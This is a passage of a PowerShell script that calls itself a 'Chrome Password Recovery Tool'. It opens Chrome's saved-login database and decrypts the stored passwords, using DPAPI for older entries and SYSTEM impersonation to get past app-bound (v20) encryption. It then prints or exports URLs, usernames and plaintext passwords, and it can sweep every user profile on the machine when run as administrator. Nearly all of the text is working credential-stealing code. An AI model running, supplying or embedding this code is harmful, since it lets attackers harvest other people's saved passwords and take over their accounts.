            $XoredAesKey = XorBytes -FirstArray $DecryptedAesKey -SecondArray $XorKey
            
            if (-not $ParsedData.Iv -or -not $ParsedData.Ciphertext -or -not $ParsedData.Tag) {
                throw "One or more required fields are null"
            }
            
            Write-DebugMessage "Starting AES-GCM decryption"
            $PlaintextBytes = DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
            Write-DebugMessage "AES-GCM decryption successful, result length: $($PlaintextBytes.Length)"
            
            return $PlaintextBytes
        }
        finally {
            [void][Advapi32]::RevertToSelf()
        }
    }
    else {
        throw "Unsupported flag: $($ParsedData.Flag)"
    }
}

# Function to extract Chrome logins using the native SQLite API
function Extract-ChromeLogins {
    param (
        [string]$databasePath
    )

    try {
        Write-DebugMessage "Starting to extract Chrome logins from: $databasePath"
        
        # Check if the file exists
        if (-not (Test-Path $databasePath)) {
            Write-DebugMessage "Database file does not exist: $databasePath"
            return $null
        }
        
        # Get file info
        $fileInfo = Get-Item $databasePath
        Write-DebugMessage "Database file size: $($fileInfo.Length) bytes"
        Write-DebugMessage "Database file last modified: $($fileInfo.LastWriteTime)"
        
        # Open the database
        $db = [IntPtr]::Zero
        $result = [WinSQLite3]::Open($databasePath, [ref]$db)
        
        if ($result -ne 0) {
            $errorMsg = [WinSQLite3]::GetErrmsg($db)
            Write-DebugMessage "Failed to open database: $errorMsg"
            return $null
        }
        
        Write-DebugMessage "Successfully opened database"
        
        # Prepare the SQL query
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $stmt = [IntPtr]::Zero
        $result = [WinSQLite3]::Prepare2($db, $query, -1, [ref]$stmt, [IntPtr]::Zero)
        
        if ($result -ne 0) {
            $errorMsg = [WinSQLite3]::GetErrmsg($db)
            Write-DebugMessage "Failed to prepare query: $errorMsg"
            [WinSQLite3]::Close($db)
            return $null
        }
        
        Write-DebugMessage "Successfully prepared query"
        
        # Execute the query and process results
        $records = @()
        
        while ($true) {
            $result = [WinSQLite3]::Step($stmt)
            
            if ($result -ne 100) {  # SQLITE_ROW = 100
                break
            }
            
            # Extract column values
            $url = [WinSQLite3]::ColumnString($stmt, 0)
            $username = [WinSQLite3]::ColumnString($stmt, 1)
            $passwordBytes = [WinSQLite3]::ColumnByteArray($stmt, 2)
            
            Write-DebugMessage "Found login for URL: $url"
            Write-DebugMessage "Username: $username"
            Write-DebugMessage "Password bytes length: $($passwordBytes.Length) bytes"
            
            # Show first few bytes of password for debugging
            if ($passwordBytes.Length -gt 0) {
                $firstBytes = [System.BitConverter]::ToString($passwordBytes[0..([Math]::Min(7, $passwordBytes.Length-1))])
                Write-DebugMessage "First bytes of password: $firstBytes"
            }
            
            # Create record
            $record = @{
                origin_url = $url
                username_value = $username
                password_value = $passwordBytes
            }
            
            $records += $record
        }
        
        # Clean up
        [WinSQLite3]::Finalize($stmt)
        [WinSQLite3]::Close($db)
        
        Write-DebugMessage "Extracted $($records.Count) login records"
        return $records
    }
    catch {
        Write-DebugMessage "Error extracting Chrome logins: $_"
        return $null
    }
}

# Function to find Chrome's Local State file
function Find-ChromeLocalState {
    param (
        [string]$userDataPath
    )
    
    # First check in the Default profile
    $localStatePath = Join-Path $userDataPath "Local State"
    if (Test-Path $localStatePath) {
        Write-DebugMessage "Found Local State in Default profile: $localStatePath"
        return $localStatePath
    }
    
    # If not found, check in the parent User Data directory
    $parentPath = Split-Path $userDataPath -Parent
    $localStatePath = Join-Path $parentPath "Local State"
    if (Test-Path $localStatePath) {
        Write-DebugMessage "Found Local State in User Data directory: $localStatePath"
        return $localStatePath
    }
    
    # If still not found, check if there are other profiles
    $profilesPath = Join-Path $parentPath "*"
    $profiles = Get-ChildItem -Path $profilesPath -Directory | Where-Object { $_.Name -match "Profile \d+" }
    
    foreach ($profile in $profiles) {
        $localStatePath = Join-Path $profile.FullName "Local State"
        if (Test-Path $localStatePath) {
            Write-DebugMessage "Found Local State in profile $($profile.Name): $localStatePath"
            return $localStatePath
        }
    }
    
    Write-DebugMessage "Local State file not found in any location"
    return $null
}

# Function to decrypt Chrome passwords with debugging
function Get-ChromePasswords {
    param (
        [string]$userDataPath
    )

    # Paths to Chrome files
    $loginDataPath = Join-Path $userDataPath "Login Data"
    $localStatePath = Find-ChromeLocalState -userDataPath $userDataPath

    Write-DebugMessage "Chrome user data path: $userDataPath"
    Write-DebugMessage "Login Data path: $loginDataPath"
    Write-DebugMessage "Local State path: $localStatePath"

    # Check if files exist
    if (-not (Test-Path $loginDataPath)) {
        Write-DebugMessage "Login Data file not found at $loginDataPath"
        Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
        Write-ColoredOutput "Login Data file not found at $loginDataPath`n" $colors.Info
        return @()  # Return empty array instead of null
    }

    if (-not $localStatePath) {
        Write-DebugMessage "Local State file not found in any location"
        Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
        Write-ColoredOutput "Local State file not found. This is required for decrypting Chrome passwords.`n" $colors.Info
        return @()  # Return empty array instead of null
    }

    # Create a copy of the Login Data file to avoid locking issues
    $tempLoginData = Join-Path $env:TEMP "Login Data_$([Guid]::NewGuid().ToString())"
    Copy-Item -Path $loginDataPath -Destination $tempLoginData -Force
    Write-DebugMessage "Created temporary copy of Login Data at: $tempLoginData"

    try {
        # Extract logins using the native SQLite API
        $logins = Extract-ChromeLogins -databasePath $tempLoginData
        
        if (-not $logins) {
            Write-DebugMessage "No logins found in database"
            Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
            Write-ColoredOutput "No logins found in database`n" $colors.Info
            return @()  # Return empty array instead of null
        }

        Write-DebugMessage "Found $($logins.Count) logins in database"

        # Get the master key from Local State
        Write-DebugMessage "Reading Local State file..."
        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
        Write-DebugMessage "Successfully parsed Local State JSON"
        
        # Check if we have v20 passwords
        $hasV20Passwords = $false
        foreach ($login in $logins) {
            if ($login.password_value.Length -ge 3) {
                $header = [System.Text.Encoding]::ASCII.GetString($login.password_value[0..2])
                if ($header -eq "v20") {
                    $hasV20Passwords = $true
                    break
                }
            }
        }
        
        if ($hasV20Passwords) {
            $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
            if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM" -or 
                    $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "Administrative or SYSTEM rights are required to decrypt v20 blobs.`n" $colors.Info
                return @()  # Return empty array instead of null
            }
            
            Write-DebugMessage "Detected v20 passwords, proceeding with app-bound encryption decryption"
            
            # Get app-bound encrypted key
            if (-not $localStateContent.os_crypt.app_bound_encrypted_key) {
                Write-DebugMessage "No app_bound_encrypted_key found in Local State"
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "No app_bound_encrypted_key found in Local State`n" $colors.Info
                return @()  # Return empty array instead of null
            }
            
            $AppBoundEnc = [Convert]::FromBase64String($localStateContent.os_crypt.app_bound_encrypted_key)
            if ([Text.Encoding]::ASCII.GetString($AppBoundEnc[0..3]) -ne "APPB") {
                Write-DebugMessage "Not valid APPB header. Aborting."
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "Not valid APPB header. Aborting.`n" $colors.Info
                return @()  # Return empty array instead of null
            }

            $EncKeyBlob = $AppBoundEnc[4..($AppBoundEnc.Length - 1)]
            
            Write-DebugMessage "Attempting to Impersonate SYSTEM"
            
            Invoke-Impersonate > $null
            Write-DebugMessage "Successfully Impersonated System"
            Write-DebugMessage "Performing First DPAPI Unprotect as NT AUTHORITY\SYSTEM"

            try {
                $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            }
            catch {
                Write-DebugMessage "First Unprotect failed: $($_.Exception.Message)"
                [Advapi32]::RevertToSelf()
                return @()  # Return empty array instead of null
            }

            [void][Advapi32]::RevertToSelf()

            if (-not $First -or $First.Length -eq 0) {
                Write-DebugMessage "First decryption produced no data."
                return @()  # Return empty array instead of null
            }

            Write-DebugMessage "Data Byte Length: $($First.Length)"

            Write-DebugMessage "Performing second DPAPI Unprotect as $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
            try {
                $Second     = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                Write-DebugMessage "Data Byte Length: $($Second.Length)"
                
                # Add more debug information about the blob
                Write-DebugMessage "First 20 bytes of blob: $([System.BitConverter]::ToString($Second[0..19]))"
                
                # Try to parse the blob with additional error handling
                try {
                    $Parsed = Parse-ChromeKeyBlob -BlobData $Second
                    Write-DebugMessage "Successfully parsed key blob with flag: $($Parsed.Flag)"
                    
                    if ($Parsed.Flag -eq 3) {
                        Write-DebugMessage "Encrypted AES key length: $($Parsed.EncryptedAesKey.Length)"
                        Write-DebugMessage "IV length: $($Parsed.Iv.Length)"
                        Write-DebugMessage "Ciphertext length: $($Parsed.Ciphertext.Length)"
                        Write-DebugMessage "Tag length: $($Parsed.Tag.Length)"
                    }
                }
                catch {
                    Write-DebugMessage "Failed to parse key blob: $($_.Exception.Message)"
                    return @()  # Return empty array instead of null
                }
                
                try {
                    $MasterKey = Decrypt-ChromeKeyBlob -ParsedData $Parsed
                    Write-DebugMessage "Successfully decrypted master key with length: $($MasterKey.Length)"
                }
                catch {
                    Write-DebugMessage "Failed to decrypt Chrome key blob: $($_.Exception.Message)"
                    return @()  # Return empty array instead of null
                }
                
                Write-DebugMessage "Blob Type     : v20 (ABE)"
            }
            catch { 
                Write-DebugMessage "Second Unprotect failed: $($_.Exception.Message)"
                return @()  # Return empty array instead of null
            }
        } else {
            # Get the master key from Local State for v10 passwords
            if (-not $localStateContent.os_crypt -or -not $localStateContent.os_crypt.encrypted_key) {
                Write-DebugMessage "No encrypted_key found in Local State"
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "No encrypted_key found in Local State`n" $colors.Info
                return @()  # Return empty array instead of null
            }
            
            $masterKey = $localStateContent.os_crypt.encrypted_key
            Write-DebugMessage "Found encrypted_key in Local State (length: $($masterKey.Length))"

            # Decode the master key (it's base64 encoded)
            try {
                $masterKeyBytes = [System.Convert]::FromBase64String($masterKey)
                Write-DebugMessage "Successfully decoded master key (length: $($masterKeyBytes.Length) bytes)"
            } catch {
                Write-DebugMessage "Failed to decode master key: $_"
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "Failed to decode master key: $_`n" $colors.Info
                return @()  # Return empty array instead of null
            }

            # Remove the DPAPI prefix (first 5 bytes: "DPAPI")
            if ($masterKeyBytes.Length -gt 5) {
                $masterKeyBytes = $masterKeyBytes[5..$masterKeyBytes.Length]
                Write-DebugMessage "Removed DPAPI prefix from master key (new length: $($masterKeyBytes.Length) bytes)"
            } else {
                Write-DebugMessage "Master key too short after removing prefix"
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "Master key too short after removing prefix`n" $colors.Info
                return @()  # Return empty array instead of null
            }

            # Decrypt the master key using DPAPI
            try {
                $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $masterKeyBytes,
                    $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
                Write-DebugMessage "Successfully decrypted master key (length: $($MasterKey.Length) bytes)"
            } catch {
                Write-DebugMessage "Failed to decrypt master key: $_"
                Write-ColoredOutput "WARNING: " $colors.Warning -NoNewLine
                Write-ColoredOutput "Failed to decrypt master key: $_`n" $colors.Info
                return @()  # Return empty array instead of null
            }
        }

        # Process each login
        $results = @()
        foreach ($login in $logins) {
            $url = $login.origin_url
            $username = $login.username_value
            $encryptedPassword = $login.password_value

            Write-DebugMessage "Processing login for: $url"
            Write-DebugMessage "Username: $username"
            Write-DebugMessage "Encrypted password length: $($encryptedPassword.Length) bytes"

            # Skip if username is empty
            if ([string]::IsNullOrEmpty($username)) {
                Write-DebugMessage "Skipping empty username"
                continue
            }

            # Check password format
            $passwordFormat = "Unknown"
            if ($encryptedPassword.Length -ge 3) {
                $header = [System.Text.Encoding]::ASCII.GetString($encryptedPassword[0..2])
                Write-DebugMessage "Password header: $header"
                
                if ($header -eq "v10") {
                    $passwordFormat = "Chrome v10 (DPAPI)"
                } elseif ($header -eq "v11" -or $header -eq "v20") {
                    $passwordFormat = "Chrome v11/v20 (AES-GCM)"
                } else {
                    $passwordFormat = "Legacy (DPAPI)"
                }
            }
            
            Write-DebugMessage "Detected password format: $passwordFormat"

            # Decrypt based on format
            if ($passwordFormat -eq "Chrome v10 (DPAPI)") {
                Write-DebugMessage "Using Chrome v10 decryption (DPAPI)"
                try {
                    # Skip the "v10" header (3 bytes)
                    $passwordData = $encryptedPassword[3..$encryptedPassword.Length]
                    $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $passwordData,
                        $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                    Write-DebugMessage "Successfully decrypted password"
                } catch {
                    Write-DebugMessage "Failed to decrypt password: $_"
                    $password = "<Decryption Failed>"
                }
            } elseif ($passwordFormat -eq "Chrome v11/v20 (AES-GCM)") {
                Write-DebugMessage "Using Chrome v11/v20 decryption (AES-GCM)"
                
                # Check if we have enough bytes for the required components
                if ($encryptedPassword.Length -lt 31) {  # 3 bytes header + 12 bytes nonce + 16 bytes tag
                    Write-DebugMessage "Password too short for AES-GCM decryption"
                    $password = "<Decryption Failed - Too Short>"
                } else {
                    try {
                        # Skip the header (3 bytes)
                        $passwordData = $encryptedPassword[3..$encryptedPassword.Length]
                        
                        # Extract the components
                        $nonce = $passwordData[0..11]  # 12 bytes for nonce
                        $tag = $passwordData[($passwordData.Length-16)..($passwordData.Length-1)]  # 16 bytes for tag
                        $ciphertext = $passwordData[12..($passwordData.Length-17)]  # The rest is ciphertext
                        
                        Write-DebugMessage "Nonce length: $($nonce.Length) bytes"
                        Write-DebugMessage "Ciphertext length: $($ciphertext.Length) bytes"
                        Write-DebugMessage "Tag length: $($tag.Length) bytes"
                        
                        # Decrypt using AES-GCM
                        $plaintextBytes = DecryptWithAesGcm -Key $MasterKey -Iv $nonce -Ciphertext $ciphertext -Tag $tag
                        $password = [System.Text.Encoding]::UTF8.GetString($plaintextBytes)
                        Write-DebugMessage "Successfully decrypted password"
                    } catch {
                        Write-DebugMessage "Failed to decrypt password: $_"
                        $password = "<Decryption Failed>"
                    }
                }
            } else {
                # Legacy format - direct DPAPI
                Write-DebugMessage "Using legacy decryption (DPAPI)"
                try {
                    $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $encryptedPassword,
                        $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                    Write-DebugMessage "Successfully decrypted password"
                } catch {
                    Write-DebugMessage "Failed to decrypt password: $_"
                    $password = "<Decryption Failed>"
                }
            }

            $result = [PSCustomObject]@{
                URL      = $url
                Username = $username
                Password = $password
            }
            $results += $result
            Write-DebugMessage "Added result for $url"
        }

        Write-DebugMessage "Processed $($results.Count) logins successfully"
        return ,$results  # Force return as array
    }
    catch {
        Write-DebugMessage "Error processing Chrome login data: $_"
        Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
        Write-ColoredOutput "Error processing Chrome login data: $_`n" $colors.Info
        return @()  # Return empty array instead of null
    }
    finally {
        # Clean up temporary file
        if (Test-Path $tempLoginData) {
            Remove-Item -Path $tempLoginData -Force
            Write-DebugMessage "Cleaned up temporary file: $tempLoginData"
        }
    }
}

# Main execution
Write-Header "Chrome Password Recovery Tool"
Write-ColoredOutput "This script locates Chrome's login data files, extracts encrypted credentials, and decrypts them using DPAPI." $colors.Info 

 $results = @()

if ($AllUsers -and $isAdmin) {
    # Get all user profiles
    Write-Section "Processing All User Profiles"
    $userProfiles = Get-CimInstance -ClassName Win32_UserProfile | Where-Object { $_.Special -eq $false }
    Write-DebugMessage "Found $($userProfiles.Count) user profiles"
    
    foreach ($profile in $userProfiles) {
        $userDataPath = Join-Path $profile.LocalPath "AppData\Local\Google\Chrome\User Data\Default"
        Write-DebugMessage "Checking user profile: $($profile.LocalPath)"
        if (Test-Path $userDataPath) {
            Write-ColoredOutput "Processing Chrome data for user: " $colors.Info -NoNewLine
            Write-ColoredOutput "$($profile.LocalPath)" $colors.Success
            $userResults = Get-ChromePasswords -userDataPath $userDataPath
            if ($userResults -and $userResults.Count -gt 0) {
                $results += $userResults
                Write-DebugMessage "Added $($userResults.Count) results for user: $($profile.LocalPath)"
            }
        } else {
            Write-DebugMessage "Chrome user data not found for user: $($profile.LocalPath)"
        }
    }
} else {
    # Current user only
    Write-Section "Processing Current User Profile"
    $userDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default"
    Write-DebugMessage "Checking current user Chrome data path: $userDataPath"
    if (Test-Path $userDataPath) {
        Write-ColoredOutput "Processing Chrome data for current user" $colors.Info
        $results = Get-ChromePasswords -userDataPath $userDataPath
        Write-DebugMessage "Get-ChromePasswords returned $($results.Count) results"
        
        # Debug: Check if we have results but they're not being counted properly
        if ($results) {
            Write-DebugMessage "Results variable is not null"
            Write-DebugMessage "Results type: $($results.GetType())"
            if ($results -is [array]) {
                Write-DebugMessage "Results is an array with $($results.Length) elements"
            } else {
                Write-DebugMessage "Results is not an array"
            }
        } else {
            Write-DebugMessage "Results variable is null"
        }
    } else {
        Write-DebugMessage "Chrome user data not found at: $userDataPath"
        Write-ColoredOutput "ERROR: " $colors.Error -NoNewLine
        Write-ColoredOutput "Chrome user data not found at $userDataPath`n" $colors.Info
        exit 1
    }
}

# Output results
Write-DebugMessage "Final results count: $($results.Count)"
if ($results -and $results.Count -gt 0) {
    Write-Section "Results"
    Write-ColoredOutput "Found " $colors.Info -NoNewLine
    Write-ColoredOutput "$($results.Count)" $colors.Success -NoNewLine
    Write-ColoredOutput " passwords" $colors.Info
    
    # Format and display the table with colors
    $table = $results | Format-Table -AutoSize | Out-String -Width 4096
    $lines = $table -split "`n"
    
    # First line (header)
    if ($lines.Count -gt 0) {
        Write-ColoredOutput $lines[0] $colors.Table[0]
    }
    
    # Second line (separator)
    if ($lines.Count -gt 1) {
        Write-ColoredOutput $lines[1] $colors.Table[0]
    }
    
    # Data rows
    for ($i = 2; $i -lt $lines.Count; $i++) {
        Write-ColoredOutput $lines[$i] $colors.Table[1]
    }
    
    # Save to file if specified
    if ($OutputFile) {
        $results | Export-Csv -Path $OutputFile -NoTypeInformation -Encoding UTF8
        Write-ColoredOutput "`nResults saved to " $colors.Info -NoNewLine
        Write-ColoredOutput "$OutputFile" $colors.Success
    }
} else {
    Write-Section "Results"
    Write-ColoredOutput "No Chrome passwords found or decryption failed.`n" $colors.Warning
}
